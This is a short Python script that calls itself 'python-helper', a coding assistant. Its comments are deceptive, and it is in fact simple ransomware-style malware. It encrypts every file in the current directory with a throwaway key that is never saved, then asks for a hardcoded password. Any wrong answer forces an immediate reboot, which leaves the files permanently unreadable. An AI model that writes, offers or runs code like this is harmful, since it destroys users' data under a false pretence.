import time
import os
from cryptography.fernet import Fernet

# Searching for files to help on with coding exept from the helper file
files = []

for file in os.listdir():
	if file == "python-helper.py":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

# Creating a key for any backup saves
secretkey = Fernet.generate_key()

# Going through the files list and serching everything for problems
for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted = Fernet(secretkey).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)
print(" ")
print(" ")
print("Welcome to python-helper!!!")
print("If Assistant crashes, please restart your Computer or PY program")
time.sleep(15)
print(" ")
print(" ")
print(" ")

time.sleep(5)
password = "pASS?0wRd"


userInput = input(" \n")
time.sleep(2)


if userInput == password:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
	print("Restart your PC")

else:
	time.sleep(5)
	print("Restarting your PC")
	os.system("shutdown /r /t 1")	
